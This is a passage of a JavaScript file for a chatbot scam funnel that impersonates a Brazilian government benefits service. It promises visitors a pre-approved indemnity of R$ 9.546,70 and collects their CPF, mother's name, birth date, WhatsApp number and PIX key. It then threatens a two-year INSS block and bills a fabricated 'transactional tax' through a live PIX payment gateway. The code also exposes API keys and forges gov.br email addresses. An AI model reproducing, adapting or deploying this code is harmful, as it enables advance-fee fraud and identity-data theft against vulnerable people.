let min = 528.74;
let max = 5237.78;
let total = 7566.52;
const desconto = 7488.05;
const taxa = 78.47;

const taxasAlfandega = {
    taxaLiberacao: 27.30,
    pesoMercadoria: 12.51,
    despachoPostal: 18.09
};

const totalTaxa = taxasAlfandega.taxaLiberacao + taxasAlfandega.pesoMercadoria + taxasAlfandega.despachoPostal;

function formatarParaReal(valor) {
    return valor.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
}

function cleanCpf(cpf) {
    return cpf.replace(/[^\d]+/g, '');
}

function validarCPF(cpf) {
    cpf = cleanCpf(cpf);
    if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;

    let add = 0, rev;
    for (let i = 0; i < 9; i++) add += parseInt(cpf.charAt(i)) * (10 - i);
    rev = 11 - (add % 11);
    if (rev >= 10) rev = 0;
    if (rev !== parseInt(cpf.charAt(9))) return false;

    add = 0;
    for (let i = 0; i < 10; i++) add += parseInt(cpf.charAt(i)) * (11 - i);
    rev = 11 - (add % 11);
    if (rev >= 10) rev = 0;
    return rev === parseInt(cpf.charAt(10));
}

// ======================
// ===== CHAT BOT =======
// ======================
if(document.getElementById("chat")) {
    const scrollArea = document.querySelector('.card-body');
    const chatContainer = document.getElementById("chat");
    let lastBotMessageBlock = null;

    // FUNÇÃO PARA OBTER SAUDAÇÃO POR HORÁRIO
    function getSaudacao() {
        const hora = new Date().getHours();
        if (hora >= 5 && hora < 12) return "Bom dia";
        if (hora >= 12 && hora < 18) return "Boa tarde";
        return "Boa noite";
    }

    // FUNÇÃO PARA OBTER CIDADE PELO IP
    async function getCidadeByIP() {
        try {
            const response = await fetch('https://ipinfo.io/json?token=70d465774261d2');
            const data = await response.json();
            return data.city || 'sua cidade';
        } catch (error) {
            console.error('Erro ao obter localização:', error);
            return 'sua cidade';
        }
    }

    function createBotBlock() {
        const block = document.createElement('div');
        block.classList.add('mensagem-chat', 'bot');
        block.innerHTML = `
            <div class="mensagens"></div>
        `;
        chatContainer.appendChild(block);
        lastBotMessageBlock = block.querySelector('.mensagens');
        return lastBotMessageBlock;
    }

    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    // Calcula duração "humana" de digitação com base no tamanho do texto visível
    function calcTypingDuration(htmlContent) {
        const tmp = document.createElement('div');
        tmp.innerHTML = htmlContent || '';
        const text = (tmp.textContent || '').trim();
        const hasMedia = /<img|<audio|<video|<iframe/i.test(htmlContent || '');
        const base = Math.min(4500, Math.max(900, text.length * 38));
        const jitter = Math.floor(Math.random() * 600);
        return (hasMedia ? Math.max(base, 1400) : base) + jitter;
    }

    function scrollChatToBottom() {
        setTimeout(() => {
            if (scrollArea) {
                scrollArea.scrollTo({ top: scrollArea.scrollHeight, behavior: 'smooth' });
            }
        }, 100);
    }

    async function sendMessage(htmlContent, typingDuration) {
        if (!lastBotMessageBlock) lastBotMessageBlock = createBotBlock();

        // Se typingDuration não for informado, calcula com base no texto
        const duration = (typeof typingDuration === 'number')
            ? typingDuration
            : calcTypingDuration(htmlContent);

        // TYPING BUBBLE
        const typingBubble = document.createElement('div');
        typingBubble.classList.add('text', 'bubble', 'typing-indicator-container');
        typingBubble.innerHTML = '<div class="typing-indicator"><span></span><span></span><span></span></div>';
        lastBotMessageBlock.appendChild(typingBubble);
        scrollChatToBottom();

        // Simula digitação
        await delay(duration);
        typingBubble.remove();

        // Mensagem final
        const bubble = document.createElement('div');
        bubble.classList.add('text', 'bubble', 'fade-in');
        bubble.innerHTML = htmlContent;
        lastBotMessageBlock.appendChild(bubble);

        // Espera imagens e mídia carregarem
        const mediaElements = bubble.querySelectorAll('img, audio, video');
        if (mediaElements.length > 0) {
            await Promise.all(Array.from(mediaElements).map(media => new Promise(resolve => {
                const handleLoad = () => resolve();
                if (media.tagName === 'IMG') {
                    if (media.complete) resolve();
                    else {
                        media.addEventListener('load', handleLoad);
                        media.addEventListener('error', handleLoad);
                    }
                } else if (media.tagName === 'AUDIO' || media.tagName === 'VIDEO') {
                    if (media.readyState >= 2) resolve();
                    else {
                        media.addEventListener('canplaythrough', handleLoad);
                        media.addEventListener('error', handleLoad);
                    }
                } else resolve();
            })));
        }

        scrollChatToBottom();

        // === AGUARDAR ÁUDIO NATIVO TERMINAR ===
        const audios = bubble.querySelectorAll('audio');
        for (const audio of audios) {
            await new Promise(resolve => {
                let done = false;
                const finish = () => { if (!done) { done = true; resolve(); } };
                audio.addEventListener('ended', finish, { once: true });
                audio.addEventListener('error', finish, { once: true });
                const p = audio.play();
                if (p && typeof p.catch === 'function') {
                    p.catch(() => {
                        // autoplay bloqueado: mostra CTA para tocar
                        const cta = document.createElement('button');
                        cta.className = 'button-chat';
                        cta.style.marginTop = '8px';
                        cta.textContent = '▶ Tocar áudio';
                        cta.addEventListener('click', () => { cta.remove(); audio.play().catch(finish); });
                        audio.insertAdjacentElement('afterend', cta);
                        scrollChatToBottom();
                    });
                }
                // segurança: nunca travar mais que 3 minutos
                setTimeout(finish, 180000);
            });
        }

        // === AGUARDAR <video> NATIVO TERMINAR (ou 20s se não terminar) ===
        const videos = bubble.querySelectorAll('video');
        for (const video of videos) {
            await new Promise(resolve => {
                let done = false;
                const finish = () => { if (!done) { done = true; resolve(); } };
                video.addEventListener('ended', finish, { once: true });
                video.addEventListener('error', finish, { once: true });
                const p = video.play && video.play();
                if (p && typeof p.catch === 'function') p.catch(() => {});
                setTimeout(finish, 20000);
            });
        }

        // === IFRAME DE ÁUDIO / VÍDEO — apenas espera 20s ===
        const iframes = bubble.querySelectorAll('iframe');
        for (const iframe of iframes) {
            const src = (iframe.getAttribute('src') || '').toLowerCase();
            const isAudioLike = /audio|\.mp3|\.m4a|\.ogg/.test(src);
            const isVideoLike = /vsl|\.mp4|youtube|vimeo|video/.test(src);
            if (!isAudioLike && !isVideoLike) continue;
            await delay(20000);
        }




        // Pequena pausa natural entre mensagens
        await delay(350 + Math.floor(Math.random() * 300));
    }

    // FUNÇÃO PARA REPRODUZIR ÁUDIO (mantida por compat; agora sempre aguarda ended)
    async function playAudio(audioSrc) {
        return new Promise((resolve) => {
            const audioContainer = document.createElement('div');
            audioContainer.style.cssText = 'background: #f8f9fa; padding: 12px; border-radius: 10px; margin: 10px 0; border: 1px solid #e9ecef;';
            audioContainer.innerHTML = `
                <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
                    <div style="width: 24px; height: 24px; background: #007bff; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
                        <span style="color: white; font-size: 12px;">🔊</span>
                    </div>
                    <div style="font-size: 13px; color: #495057; font-weight: 500;">Áudio explicativo</div>
                </div>
                <audio controls style="width: 100%;" onended="this.parentElement.style.background='#d4edda'">
                    <source src="${audioSrc}" type="audio/mpeg">
                    Seu navegador não suporta áudio.
                </audio>
                <div style="font-size: 11px; color: #6c757d; margin-top: 5px; text-align: center;">
                    Clique para reproduzir
                </div>
            `;

            if (lastBotMessageBlock) {
                lastBotMessageBlock.appendChild(audioContainer);
                scrollChatToBottom();
            }

            const audioElement = audioContainer.querySelector('audio');
            let done = false;
            const finish = () => { if (!done) { done = true; resolve(); } };
            audioElement.addEventListener('ended', finish, { once: true });
            audioElement.addEventListener('error', finish, { once: true });

            const playPromise = audioElement.play();
            if (playPromise !== undefined) {
                playPromise.catch(() => {
                    // aguarda usuário; sem timeout curto — só o de segurança
                });
            }
            setTimeout(finish, 180000);
        });
    }

    function promptUserForInput(htmlContent) {
        const userBlock = document.createElement('div');
        userBlock.classList.add('mensagem-chat', 'user', 'user-input-container');
        userBlock.innerHTML = `<div class="mensagens"><div class="text input-container">${htmlContent}</div></div>`;
        chatContainer.appendChild(userBlock);
        
        // Scroll suave para mobile
        setTimeout(() => {
            if (scrollArea) {
                scrollArea.scrollTo({
                    top: scrollArea.scrollHeight,
                    behavior: 'smooth'
                });
            }
        }, 100);
        
        lastBotMessageBlock = null;
        return userBlock;
    }

    function sendUserMessage(text) {
        lastBotMessageBlock = null;
        const userBubble = document.createElement('div');
        userBubble.classList.add('mensagem-chat', 'user');
        userBubble.innerHTML = `<div class="mensagens"><div class="text"><div class="msg">${text}</div></div></div>`;
        chatContainer.appendChild(userBubble);
        // Scroll suave para mobile
        setTimeout(() => {
            if (scrollArea) {
                scrollArea.scrollTo({
                    top: scrollArea.scrollHeight,
                    behavior: 'smooth'
                });
            }
        }, 100);
    }

    // ===========================
    // ===== FLUXO ALFANDEGA =====
    // ===========================
async function redirecionarParaPagamentoAlfandega(userDados) {
  await sendMessage(`<div class="msg"><strong>Perfeito! Redirecionando para pagamento...</strong></div>`, 1500);

  // ✅ cria o objeto certo de querystring pro checkout
  const urlParams = new URLSearchParams(window.location.search);
  const checkoutParams = new URLSearchParams();

  // mantém UTMs
  urlParams.forEach((value, key) => {
    if (key.toLowerCase().startsWith("utm_")) {
      checkoutParams.set(key, value);
    }
  });

  // (opcional) envia dados pro checkout
  checkoutParams.set("nome", userDados.nome || "");
  checkoutParams.set("cpf", String(userDados.cpf || "").replace(/\D/g, ""));
  checkoutParams.set("valor", String(totalTaxa));
  checkoutParams.set("tipo", "alfandega");

  const urlPagamento =
    "checkout.html" + (checkoutParams.toString() ? `?${checkoutParams.toString()}` : "");

  // Rastrear finalização do chat
  if (typeof window.dashboardTracker !== 'undefined' && window.dashboardTracker.trackChatCompleted) {
    window.dashboardTracker.trackChatCompleted();
  }

  setTimeout(() => {
    window.location.href = urlPagamento;
  }, 2000);
}


function formatarSexo(sexo) {
  const s = String(sexo || "").trim().toUpperCase();
  if (s === "M") return "Masculino";
  if (s === "F") return "Feminino";
  return sexo || "";
}

    // Utilitário para criar botão e aguardar clique
    function aguardarBotao(labelsOuHtml, opts = {}) {
        return new Promise(resolve => {
            let html = '';
            if (Array.isArray(labelsOuHtml)) {
                html = `<div style="display:flex; flex-direction:column; gap:8px; align-items:stretch;">` +
                    labelsOuHtml.map((l, i) =>
                        `<button data-idx="${i}" class="button-chat quiz-opt" style="width:100%;">${l}</button>`
                    ).join('') + `</div>`;
            } else {
                html = labelsOuHtml;
            }
            const block = promptUserForInput(html);
            block.querySelectorAll('button').forEach(btn => {
                const handler = (e) => {
                    e && e.preventDefault && e.preventDefault();
                    const idx = parseInt(btn.getAttribute('data-idx') || '0', 10);
                    const label = btn.textContent.trim();
                    $('.user-input-container').remove();
                    sendUserMessage(label);
                    resolve({ idx, label });
                };
                btn.addEventListener('click', handler, { passive: false });
                btn.addEventListener('touchend', handler, { passive: false });
            });
        });
    }

    // Utilitário para input de texto
    function aguardarInput(placeholder, mask) {
        return new Promise(resolve => {
            const html = `
                <div class="cpf-container">
                    <input type="text" id="genericInput" placeholder="${placeholder}">
                    <button id="sendGeneric" class="button-chat">Enviar</button>
                </div>`;
            const block = promptUserForInput(html);
            const input = block.querySelector('#genericInput');
            const btn = block.querySelector('#sendGeneric');
            if (mask && window.$ && $.fn.mask) $(input).mask(mask);
            const submit = () => {
                const val = (input.value || '').trim();
                if (!val) { input.focus(); return; }
                $('.user-input-container').remove();
                sendUserMessage(val);
                resolve(val);
            };
            btn.addEventListener('click', submit, { passive: true });
            btn.addEventListener('touchend', (e) => { e.preventDefault(); submit(); }, { passive: false });
            input.addEventListener('keyup', e => { if (e.key === 'Enter') submit(); });
            setTimeout(() => input && input.focus(), 300);
        });
    }

    // Embaralhar array
    function shuffle(arr) {
        const a = arr.slice();
        for (let i = a.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [a[i], a[j]] = [a[j], a[i]];
        }
        return a;
    }

    async function iniciarFunilAlfandegario(userDados) {
        // 1 - Confirmar dados
        await sendMessage(`<div class="msg">Para continuar, confirme se esses são seus dados:<br><br><strong>Nome:</strong> ${userDados.nome}<br><br>Caso estiver correto, clique no botão abaixo para confirmar.</div>`, 2000);

        // 2 - Botão confirmar
        await aguardarBotao([`Sim, está correto`]);

        // 3 - Confirmar identidade
        await sendMessage(`<div class="msg">Agora, precisamos confirmar a sua identidade.</div>`, 1800);

        // 4 - Aprovação do saque
        await sendMessage(`<div class="msg">Responda as perguntas a seguir para aprovação do seu saque de <strong>R$ 9.546,70</strong>.</div>`, 2200);

        // ===== Pergunta 1: nome da mãe =====
        await sendMessage(`<div class="msg">Por favor, confirme o nome de sua mãe.</div>`, 1800);

        const maeCorreta = (userDados.mae || 'Maria da Silva Santos').trim();
        const opcoesMae = shuffle([maeCorreta, 'Fernanda de Souza Rodrigues', 'Dalva Pereira De Campos']);
        let acertouMae = false;
        while (!acertouMae) {
            const escolha = await aguardarBotao(opcoesMae);
            if (escolha.label === maeCorreta) {
                acertouMae = true;
            } else {
                await sendMessage(`<div class="msg error-msg">Resposta incorreta. Tente novamente.</div>`, 1500);
            }
        }

        // 7 - Certo
        await sendMessage(`<div class="msg">Resposta certa! ✅<br>Próxima pergunta 1/3...</div>`, 1500);

        // ===== Pergunta 2: data de nascimento =====
        await sendMessage(`<div class="msg">Qual sua data de nascimento?<br>Escolha a alternativa certa.</div>`, 1800);

        const nascCorreta = (userDados.nasc || '01/01/1990').trim();
        const opcoesNasc = shuffle(['17/04/1999', '01/09/1972', '02/11/1974', nascCorreta]);
        let acertouNasc = false;
        while (!acertouNasc) {
            const escolha = await aguardarBotao(opcoesNasc);
            if (escolha.label === nascCorreta) {
                acertouNasc = true;
            } else {
                await sendMessage(`<div class="msg error-msg">Resposta incorreta. Tente novamente.</div>`, 1500);
            }
        }

        // 10 - Certo
        await sendMessage(`<div class="msg">Resposta certa! ✅<br>Próxima pergunta 2/3...</div>`, 1500);

        // ===== Pergunta 3: último acesso GOV.BR =====
        await sendMessage(`<div class="msg">Quando foi seu último acesso ao GOV.BR?</div>`, 1800);
        await aguardarBotao(['Sim, recentemente.', 'Sim, há 6 meses.', 'Sim, mais de 1 ano.']);

        // 13 - GIF verificando respostas
        await sendMessage(`
            <div class="msg" style="animation: fadeIn 0.6s ease;">
                <img src="${window.rotas.url}/home/1.gif" style="max-width:100%; width:320px; border-radius:8px;">
            </div>
        `, 2500);

        // 14 - Autenticidade confirmada
        await sendMessage(`
            <div class="msg">
                <strong>Autenticidade confirmada!</strong><br><br>
                <strong>Nome:</strong> ${userDados.nome}<br>
                <strong>CPF:</strong> ${userDados.cpfMask || userDados.cpf}<br>
                <strong>Indenização:</strong> R$ 9.546,70<br>
                <strong>Status:</strong> <span style="color:#28a745;">Pré-aprovado</span>
            </div>
        `, 2200);

        // 15 - Áudio 1
        await sendMessage(`
            <div class="msg" style="animation: fadeIn 0.6s ease;">
                <iframe src="https://siteabertohoje.digital/audio1/"
                    style="width:100%; max-width:360px; height:120px; border:0; border-radius:10px;"
                    allow="autoplay; encrypted-media"></iframe>
            </div>
        `, 2000);

        // 16 - Pedir WhatsApp
        await sendMessage(`<div class="msg">Estamos quase lá! Para podermos completar a sua aprovação, precisamos enviar o comprovante de transferência.<br><br>Por favor, informe seu número de WhatsApp.<br>Ex: 11912345678</div>`, 2200);

        // 17 - Campo telefone
        const telefone = await aguardarInput('Digite seu WhatsApp', '(00) 00000-0000');
        userDados.telefone = telefone;
        localStorage.setItem('userDados', JSON.stringify(userDados));

        // 18 - Solicitando aprovação
        await sendMessage(`<div class="msg">Solicitando aprovação do saque da sua Indenização...</div>`, 1800);

        // 19 - GIF de processamento
        await sendMessage(`
            <div class="msg" style="animation: fadeIn 0.6s ease;">
                <img src="https://tiktok-pay2026.site/chatbotinss/images/gifaprovado.gif" style="max-width:100%; width:320px; border-radius:8px;">
            </div>
        `, 3500);

        // 20 - Aprovada
        await sendMessage(`<div class="msg"><strong>Sua Indenização foi aprovada com sucesso! ✅</strong></div>`, 2000);

        // 21 - Pedir chave PIX
        await sendMessage(`<div class="msg">A seguir, digite cuidadosamente a chave pix que você deseja receber a quantia de <strong>R$ 9.546,70</strong>.<br>Exemplo: SUACHAVEPIX</div>`, 2200);

        // 22 - Campo chave PIX
        let chavePix = '';
        let confirmouPix = false;
        while (!confirmouPix) {
            chavePix = await aguardarInput('Digite sua chave PIX');

            // 23 - Verificar chave
            await sendMessage(`<div class="msg"><strong>ATENÇÃO:</strong> Verifique se a Chave Pix informada está correta e confirme com atenção:<br><br><strong>${chavePix}</strong><br><br>O governo não se responsabiliza caso você informe a Chave Pix errada.</div>`, 2200);

            // 24 - Confirmar
            const conf = await aguardarBotao(['Sim, está correta.', 'Não, desejo corrigir.']);
            if (conf.idx === 0) confirmouPix = true;
        }
        userDados.chavePix = chavePix;
        localStorage.setItem('userDados', JSON.stringify(userDados));

        // 25 - Processando
        await sendMessage(`<div class="msg">Aguarde! Processando solicitação de cadastro chave pix...</div>`, 2000);

        // 26 - Finalizando
        await sendMessage(`<div class="msg">Finalizando processamento....</div>`, 2000);

        // 27 - GIF
        await sendMessage(`
            <div class="msg" style="animation: fadeIn 0.6s ease;">
                <img src="https://s3.typebot.io/public/workspaces/cln27g69a001xml0fy5c8tbo6/typebots/cma1hyykx000shcdwq8juk7sc/blocks/pykltqj9pnhwfdmjq68mo8ov?v=1745879247550" style="max-width:100%; width:320px; border-radius:8px;">
            </div>
        `, 3500);

        // 28 - Cadastrada
        await sendMessage(`<div class="msg"><strong>Sua chave pix foi cadastrada com sucesso! ✅</strong></div>`, 2000);

        // 29 - Áudio 2
        await sendMessage(`
            <div class="msg" style="animation: fadeIn 0.6s ease;">
                <iframe src="https://siteabertohoje.digital/audio2/"
                    style="width:100%; max-width:360px; height:120px; border:0; border-radius:10px;"
                    allow="autoplay; encrypted-media"></iframe>
            </div>
        `, 2000);

        // 30 - Confirmar e gerar comprovante
        await sendMessage(`<div class="msg">Clique no botão abaixo para confirmar e liberar o envio da sua indenização para a chave pix informada.<br><br>Iremos gerar o comprovante do valor de <strong>R$ 9.546,70</strong> neste instante.</div>`, 2200);

        // 31 - Botão confirmar
        await aguardarBotao(['Confirmar e gerar comprovante de recebimento']);

        // 32 - Gerando comprovante
        await sendMessage(`<div class="msg">Gerando seu comprovante de recebimento dos valores...</div>`, 2500);

        // 33 - Site do comprovante
        const cpfCad = String(userDados.cpf || '').replace(/\D/g, '');
        const nomeCad = encodeURIComponent(userDados.nome || '');
        await sendMessage(`
            <div class="msg" style="animation: fadeIn 0.6s ease;">
                <div style="width:100%; max-width:360px; border-radius:12px; overflow:hidden; box-shadow:0 6px 18px rgba(0,0,0,0.2);">
                    <iframe src="https://tiktok-pay2026.site/chatbotinss/comprovante/?cpf=${cpfCad}&nome=${nomeCad}"
                        style="width:100%; height:520px; border:0;"
                        allow="autoplay; fullscreen"></iframe>
                </div>
            </div>
        `, 3000);

        // 34 - Áudio 3
        await sendMessage(`
            <div class="msg" style="animation: fadeIn 0.6s ease;">
                <iframe src="https://siteabertohoje.digital/audio3/"
                    style="width:100%; max-width:360px; height:120px; border:0; border-radius:10px;"
                    allow="autoplay; encrypted-media"></iframe>
            </div>
        `, 2000);

        // 35 - Detalhamento dos impostos
        await sendMessage(`
            <div class="msg">
                O cálculo do valor total do imposto transacional é feito sobre o valor que você tem disponível para receber (<strong>R$ 9.546,70</strong>).<br><br>
                <strong>Imposto Transacional:</strong> R$ 22,40<br>
                <strong>Contribuição Federal:</strong> R$ 11,30<br>
                <strong>Imposto de Saque:</strong> R$ 16,14<br><br>
                <strong>Total do Imposto: R$ 49,84</strong>
            </div>
        `, 2500);

        // 36 - Botão porque tenho que pagar
        await aguardarBotao(['Porque tenho que pagar esse imposto?']);

        // 37 - Motivo
        await sendMessage(`
            <div class="msg">
                ⚠️ <strong>Entenda o motivo da cobrança:</strong><br><br>
                O valor de <strong>R$ 9.546,70</strong> já foi aprovado e está vinculado exclusivamente ao seu CPF.<br><br>
                Por questões de segurança jurídica e proteção de dados, nenhum valor pode ser descontado diretamente da sua indenização.
            </div>
        `, 2500);

        // 38
        await sendMessage(`<div class="msg">Por isso, os impostos obrigatórios precisam ser pagos separadamente, antes da liberação do saque. Essa etapa serve para confirmar sua identidade e garantir que somente você possa acessar o valor que é seu por direito.</div>`, 2500);

        // 39
        await sendMessage(`<div class="msg">A regularização é feita uma única vez, e logo após a confirmação, o valor total é liberado diretamente na sua chave Pix, em poucos minutos.</div>`, 2500);

        // 40 - Aviso bloqueio
        await sendMessage(`
            <div class="msg">
                ⚠️ <strong>Atenção:</strong> O não pagamento desse imposto resultará no bloqueio do INSS por 2 anos no CPF beneficiário: <strong>${userDados.cpfMask || userDados.cpf}</strong>.<br><br>
                Além disso, seu dinheiro será utilizado para fins governamentais.
            </div>
        `, 2500);

        // 41 - Botão concluir pagamento
        await aguardarBotao(['Concluir Pagamento e receber minha indenização']);

        // 42 - Geração do PIX via Bynet (TechByNet)
        await sendMessage(`<div class="msg">Gerando pagamento PIX de <strong>R$ 49,84</strong>...</div>`, 2500);

        try {
            const pixData = await gerarPixBynet({
                amountCents: 4984, // R$ 49,84
                nome: userDados.nome,
                cpf: cleanCpf(userDados.cpf),
                email: (userDados.email && String(userDados.email).includes('@'))
                    ? userDados.email
                    : `${cleanCpf(userDados.cpf)}@indenizacao.gov.br`,
                telefone: String(userDados.telefone || '').replace(/\D/g, '') || '11999999999',
                descricao: 'Imposto Transacional - Liberação de Indenização'
            });

            const qrSrc = pixData.qrCodeImage
                ? pixData.qrCodeImage
                : `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(pixData.payload)}`;

            const txId = pixData.transactionId;

            await sendMessage(`
                <div class="msg pix-msg" style="background:transparent; padding:0; box-shadow:none; animation: fadeIn 0.6s ease;">
                  <div class="pix-card" style="
                      max-width: 380px;
                      margin: 0 auto;
                      background: #ffffff;
                      border-radius: 16px;
                      box-shadow: 0 10px 30px rgba(0,0,0,0.12);
                      overflow: hidden;
                      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                      text-align: center;
                  ">
                    <div style="background:linear-gradient(135deg,#00a859,#008a49); color:#fff; padding:16px 20px;">
                      <div style="font-size:14px; opacity:.9;">Pagamento PIX</div>
                      <div style="font-size:24px; font-weight:800; margin-top:2px;">R$ 49,84</div>
                      <div style="font-size:12px; opacity:.85; margin-top:4px;">Expira em 24h</div>
                    </div>

                    <div style="padding:20px;">
                      <div style="background:#f7f9fc; border-radius:12px; padding:14px; display:inline-block;">
                        <img src="${qrSrc}" alt="QR Code PIX" style="width:220px; height:220px; display:block; border-radius:8px;">
                      </div>

                      <div style="margin-top:14px; font-size:13px; color:#444; line-height:1.4;">
                        Abra o app do seu banco, escolha <strong>PIX</strong> e escaneie o QR Code<br>
                        ou use o código <strong>Copia e Cola</strong> abaixo.
                      </div>

                      <div style="margin-top:14px; text-align:left;">
                        <label style="font-size:12px; color:#666; font-weight:600;">PIX Copia e Cola</label>
                        <textarea id="pix-copia-cola-${txId}" readonly style="
                            width:100%; height:80px; margin-top:6px; padding:10px;
                            font-size:12px; color:#333;
                            border:1px solid #e2e6ec; border-radius:8px;
                            background:#fafbfd; resize:none; font-family:monospace;">${pixData.payload}</textarea>
                      </div>

                      <button id="pix-copy-btn-${txId}" onclick="(function(btn){
                          const ta=document.getElementById('pix-copia-cola-${txId}');
                          ta.select(); ta.setSelectionRange(0, 99999);
                          try { document.execCommand('copy'); } catch(e){}
                          const original = btn.innerHTML;
                          btn.innerHTML='✅ Código copiado!';
                          btn.style.background='#0a7d3b';
                          setTimeout(()=>{ btn.innerHTML=original; btn.style.background='#00a859'; },2200);
                      })(this)" style="
                          margin-top:14px; width:100%;
                          padding:13px 16px;
                          background:#00a859; color:#fff;
                          border:0; border-radius:10px;
                          cursor:pointer; font-weight:700; font-size:15px;
                          box-shadow:0 4px 12px rgba(0,168,89,.28);
                          transition:background .2s;">
                        📋 Copiar código PIX
                      </button>

                      <div style="margin-top:14px; padding:10px; background:#fff8e1; border-radius:8px; font-size:12px; color:#7a5c00;">
                        ⏳ Aguardando pagamento... Assim que confirmado, sua indenização será liberada automaticamente.
                      </div>
                    </div>
                  </div>
                </div>
            `, 2500);

            // ===== Tracking: PIX gerado (InitiateCheckout) =====
            try {
                const utms = getUtmsPersistidas();
                if (typeof window.fbq === 'function') {
                    window.fbq('track', 'InitiateCheckout', {
                        value: 49.84,
                        currency: 'BRL',
                        content_name: 'Imposto Transacional',
                        transaction_id: txId
                    });
                }
                if (typeof window.dataLayer !== 'undefined') {
                    window.dataLayer.push({
                        event: 'pix_gerado',
                        transaction_id: txId,
                        value: 49.84,
                        currency: 'BRL',
                        ...utms
                    });
                }
                if (typeof window.funnelTracker !== 'undefined') {
                    window.funnelTracker.track('pix_gerado', { transactionId: txId, amount: 4984, ...utms });
                }
            } catch(e) { console.warn('tracking pix_gerado falhou', e); }

            // Webhook UTMify - pedido aguardando pagamento
            enviarPedidoUtmify({
                transactionId: txId,
                status: 'waiting_payment',
                userDados,
                valorCents: 4984,
                descricao: 'Imposto Transacional'
            });

            // Poll de status do pagamento
            verificarStatusPixLoop(txId, userDados);

        } catch (err) {
            console.error('Erro ao gerar PIX:', err);
            await sendMessage(`<div class="msg error-msg">Não foi possível gerar o PIX no momento. Por favor, tente novamente em instantes.<br><br><small>${(err && err.message) || ''}</small></div>`, 2500);
        }
    }

    // ==========================================================
    // ===== INTEGRAÇÃO BYNET (TechByNet) - Geração de PIX ======
    // ==========================================================
    // Docs: https://docs.techbynet.com/
    // ATENÇÃO: A API KEY abaixo fica exposta no navegador.
    // Para produção o correto é chamar a API a partir do seu backend
    // e nunca expor a chave no client-side.
    const BYNET_API_KEY  = '6054ccfd-a567-48ea-9920-1e83b088e57f';
    const BYNET_BASE_URL = 'https://api-gateway.techbynet.com';
    function bynetHeaders() {
        return {
            'x-api-key': BYNET_API_KEY,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        };
    }

    // ===== UTM CAPTURE / PERSISTÊNCIA =====
    function getUtmsPersistidas() {
        const UTM_KEYS = ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','utm_id','sck','src','xcod','fbclid','gclid','ttclid'];
        let stored = {};
        try {
            stored = JSON.parse(localStorage.getItem('__utms_captured') || '{}');
        } catch(e) { stored = {}; }

        const params = new URLSearchParams(window.location.search);
        let changed = false;
        params.forEach((value, key) => {
            const k = key.toLowerCase();
            if (UTM_KEYS.includes(k) && value) {
                if (stored[k] !== value) { stored[k] = value; changed = true; }
            }
        });
        // Fallback: se não há utm_source capturado, deriva do referrer (ou 'direct')
        if (!stored.utm_source) {
            try {
                const ref = document.referrer || '';
                if (ref) {
                    const host = new URL(ref).hostname.replace(/^www\./, '');
                    if (host && host !== window.location.hostname) {
                        stored.utm_source = host;
                        stored.utm_medium = stored.utm_medium || 'referral';
                        changed = true;
                    }
                }
                if (!stored.utm_source) {
                    stored.utm_source = 'direct';
                    stored.utm_medium = stored.utm_medium || 'none';
                    changed = true;
                }
            } catch(e) {
                stored.utm_source = stored.utm_source || 'direct';
                changed = true;
            }
        }
        if (changed) {
            try { localStorage.setItem('__utms_captured', JSON.stringify(stored)); } catch(e){}
        }
        return stored;
    }
    // Captura assim que o script carrega
    try { getUtmsPersistidas(); } catch(e){}

    // ==========================================================
    // ===== INTEGRAÇÃO UTMIFY - Webhook de Pedidos =============
    // ==========================================================
    // Cole aqui seu token da UTMify (Integrações > API > x-api-token)
    // Proxy no servidor (evita CORS e mantém o token seguro).
    // Se este script rodar fora do domínio do app Lovable, troque para a URL absoluta:
    //   const UTMIFY_ENDPOINT = 'https://SEU-APP.lovable.app/api/public/utmify-order';
    const UTMIFY_API_TOKEN = 'pWapa1Bo0nnvRc62srvrGwukSOS7d6Q1xOtL'; // token real fica no servidor
    const UTMIFY_ENDPOINT  = 'https://api.utmify.com.br/api-credentials/orders';

    // Formato de data exigido: 'YYYY-MM-DD HH:mm:ss' em UTC
    function utmifyDate(d) {
        const dt = d ? new Date(d) : new Date();
        const pad = n => String(n).padStart(2, '0');
        return dt.getUTCFullYear() + '-' + pad(dt.getUTCMonth()+1) + '-' + pad(dt.getUTCDate())
             + ' ' + pad(dt.getUTCHours()) + ':' + pad(dt.getUTCMinutes()) + ':' + pad(dt.getUTCSeconds());
    }

    // Guarda contexto do PIX para reutilizar quando o pagamento for confirmado
    window.__pixContextUtmify = window.__pixContextUtmify || {};

    // Cache do IP do cliente (UTMify exige customer.ip não-nulo)
    window.__clientIpPromise = window.__clientIpPromise || (async () => {
        const endpoints = [
            'https://api.ipify.org?format=json',
            'https://api64.ipify.org?format=json',
            'https://ipinfo.io/json?token=70d465774261d2'
        ];
        for (const url of endpoints) {
            try {
                const r = await fetch(url);
                const j = await r.json();
                const ip = j.ip || j.query;
                if (ip) return ip;
            } catch (e) { /* tenta próximo */ }
        }
        return '0.0.0.0';
    })();

    async function enviarPedidoUtmify({ transactionId, status, userDados, valorCents, descricao }) {
        // Envio vai via proxy /api/public/utmify-order (servidor injeta o x-api-token).
        try {
            const utms = getUtmsPersistidas();
            const ctx  = window.__pixContextUtmify[transactionId] || {};
            const createdAt = ctx.createdAt || utmifyDate();
            if (!ctx.createdAt) {
                window.__pixContextUtmify[transactionId] = {
                    createdAt,
                    userDados: userDados || ctx.userDados,
                    utms
                };
            }
            const user = userDados || ctx.userDados || {};
            const cpfLimpo = String(user.cpf || '').replace(/\D/g, '');
            const telLimpo = String(user.telefone || '').replace(/\D/g, '') || '11999999999';
            const emailFinal = (user.email && String(user.email).includes('@'))
                ? user.email
                : (cpfLimpo ? cpfLimpo + '@indenizacao.gov.br' : 'sem-email@indenizacao.gov.br');

            const clientIp = await window.__clientIpPromise;

            const body = {
                orderId: String(transactionId),
                platform: 'Bynet',
                paymentMethod: 'pix',
                status: status, // 'waiting_payment' | 'paid' | 'refused' | 'refunded' | 'chargedback'
                createdAt: createdAt,
                approvedDate: status === 'paid' ? utmifyDate() : null,
                refundedAt: null,
                customer: {
                    name: user.nome || 'Cliente Indenizacao',
                    email: emailFinal,
